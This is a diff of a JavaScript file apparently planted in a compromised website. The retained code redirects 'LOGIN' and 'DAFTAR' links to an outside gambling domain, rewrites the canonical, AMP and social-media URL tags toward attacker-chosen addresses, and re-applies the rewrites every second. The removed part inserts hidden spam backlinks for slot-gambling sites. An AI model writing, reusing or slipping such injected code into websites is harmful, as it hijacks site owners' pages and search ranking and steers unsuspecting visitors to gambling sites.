@@ -1,43 +1,13 @@
+
 // Define the official domains
 const officialDomain = 'https://smalltownstrings.com/ramblin-tour-calendar_month-1-year-2024'; 
 const ampDomain = 'https://target4d-pay4d.pages.dev/';       
-
-function insertBacklinks() {
-  
-  const link1 = document.createElement('a');
-  link1.href = 'https://media.ihram.asia/'; 
-  link1.style.display = 'none'; 
-  link1.textContent = 'cheat slot'; 
-  link1.classList.add('special-link'); 
-
-  const link2 = document.createElement('a');
-  link2.href = 'https://clouddo.eazysmart.com/'; 
-  link2.style.display = 'none'; 
-  link2.textContent = 'slot mahjong gacor'; 
-  link2.classList.add('special-link'); 
-
-  
-  const body = document.body;
-  const children = body.children;
-  
-  
-  const middleIndex = Math.floor(children.length / 2);
-  const referenceNode = children[middleIndex];
-
-  
-  if (referenceNode) {
-    body.insertBefore(link1, referenceNode); 
-    body.insertBefore(link2, referenceNode); 
-  }
-}
-
 
 function replaceAnchorTags() {
   
   const anchors = document.querySelectorAll('a');
 
   anchors.forEach(anchor => {
-    
     if (anchor.textContent.trim().toUpperCase() === 'LOGIN' || anchor.textContent.trim().toUpperCase() === 'DAFTAR') {
       anchor.href = ampDomain; 
     }
@@ -46,16 +16,16 @@ function replaceAnchorTags() {
 
 
 function forceUrlsToOfficialDomain() {
-  
+
   const canonicalLink = document.querySelector('link[rel="canonical"]');
   let canonicalBasePath = ''; 
 
   if (canonicalLink) {
     
-    canonicalBasePath = canonicalLink.href.replace(/^https?:\/\/[^\/]+/, ''); 
+    canonicalBasePath = canonicalLink.href.replace(/^https?:\/\/[^\/]+/, '');
     canonicalLink.href = officialDomain; 
   } else {
-   
+    
     const newCanonical = document.createElement('link');
     newCanonical.rel = 'canonical';
     newCanonical.href = officialDomain; 
@@ -67,26 +37,24 @@ function forceUrlsToOfficialDomain() {
   links.forEach(link => {
     
     if (link.href.startsWith('http') && !isSpecialLink(link)) {
-      const relativePath = link.href.replace(/^https?:\/\/[^\/]+/, ''); 
+      const relativePath = link.href.replace(/^https?:\/\/[^\/]+/, ''); // Ambil path setelah domain
       
       link.href = officialDomain + relativePath.replace(canonicalBasePath, ''); 
     }
   });
 
-  
   const metaUrls = document.querySelectorAll('meta[property="og:url"], meta[name="twitter:url"]');
   metaUrls.forEach(meta => {
     const metaPath = meta.content.replace(/^https?:\/\/[^\/]+/, ''); 
     meta.content = officialDomain + metaPath.replace(canonicalBasePath, ''); 
   });
 
-  
+  // Change AMP link if it exists
   const ampLink = document.querySelector('link[rel="amphtml"]');
   if (ampLink) {
     
     ampLink.href = ampDomain; 
   } else {
-    
     const newAmpLink = document.createElement('link');
     newAmpLink.rel = 'amphtml';
     newAmpLink.href = ampDomain; 
@@ -96,7 +64,7 @@ function forceUrlsToOfficialDomain() {
 
 
 function isSpecialLink(link) {
-  
+
   return link.classList.contains('login') ||
          link.classList.contains('register') ||
          link.href === officialDomain ||
@@ -106,12 +74,11 @@ function isSpecialLink(link) {
          link.textContent.trim().toUpperCase() === 'DAFTAR'; 
 }
 
-// Run the function when the DOM is fully loaded
+
 document.addEventListener('DOMContentLoaded', () => {
-  insertBacklinks(); // Tambahkan tautan dahulu
-  forceUrlsToOfficialDomain(); // Memaksakan perubahan URL
-  replaceAnchorTags(); // Memanggil fungsi untuk mengganti tautan
+  forceUrlsToOfficialDomain(); 
+  replaceAnchorTags(); 
 });
 
-// Periodically check and enforce URLs (in case of dynamic changes)
+
 setInterval(forceUrlsToOfficialDomain, 1000);
